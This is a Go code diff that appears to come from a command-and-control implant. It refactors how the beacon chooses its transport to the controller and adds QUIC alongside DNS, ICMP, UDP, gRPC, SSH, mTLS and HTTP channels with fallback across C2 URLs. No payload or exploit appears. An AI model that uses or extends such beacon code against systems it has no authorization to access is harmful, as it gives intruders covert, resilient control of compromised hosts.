@@ -199,24 +199,27 @@ var (
 )
 
 func effectiveTransport() string {
+	curProto, curBT := getProtocol(), getBeaconTransport()
 	switch {
-	case Protocol == "tcp":
+	case curProto == "tcp":
 		return "tcp"
-	case Protocol == "dns":
+	case curProto == "dns":
 		return "dns"
-	case Protocol == "icmp":
+	case curProto == "icmp":
 		return "icmp"
-	case Protocol == "udp":
+	case curProto == "udp":
 		return "udp"
-	case BeaconTransport == "wss":
+	case curProto == "quic" || curBT == "quic":
+		return "quic"
+	case curBT == "wss":
 		return "wss"
-	case BeaconTransport == "grpc":
+	case curBT == "grpc":
 		return "grpc"
-	case BeaconTransport == "ssh":
+	case curBT == "ssh":
 		return "ssh"
-	case BeaconTransport == "mtls":
+	case curBT == "mtls":
 		return "mtls"
-	case BeaconTransport == "h2c":
+	case curBT == "h2c":
 		return "h2c"
 	default:
 		return "http"
@@ -247,6 +250,9 @@ func buildTransportCandidates() []string {
 	if strings.HasPrefix(C2URL, "udp://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "udp://") {
 		add("udp")
 	}
+	if strings.HasPrefix(C2URL, "quic://") || strings.HasPrefix(c2URLAtIndex(int(currentC2Idx.Load())), "quic://") {
+		add("quic")
+	}
 	return cands
 }
 
@@ -264,15 +270,17 @@ func getTransportCandidates() []string {
 func applyTransport(name string) {
 	switch name {
 	case "tcp":
-		Protocol, BeaconTransport = "tcp", "tcp"
+		setProtocolAndTransport("tcp", "tcp")
 	case "dns":
-		Protocol, BeaconTransport = "dns", "dns"
+		setProtocolAndTransport("dns", "dns")
 	case "icmp":
-		Protocol, BeaconTransport = "icmp", "icmp"
+		setProtocolAndTransport("icmp", "icmp")
 	case "udp":
-		Protocol, BeaconTransport = "udp", "udp"
+		setProtocolAndTransport("udp", "udp")
+	case "quic":
+		setProtocolAndTransport("quic", "quic")
 	default:
-		Protocol, BeaconTransport = "http", "http"
+		setProtocolAndTransport("http", "http")
 	}
 }
 
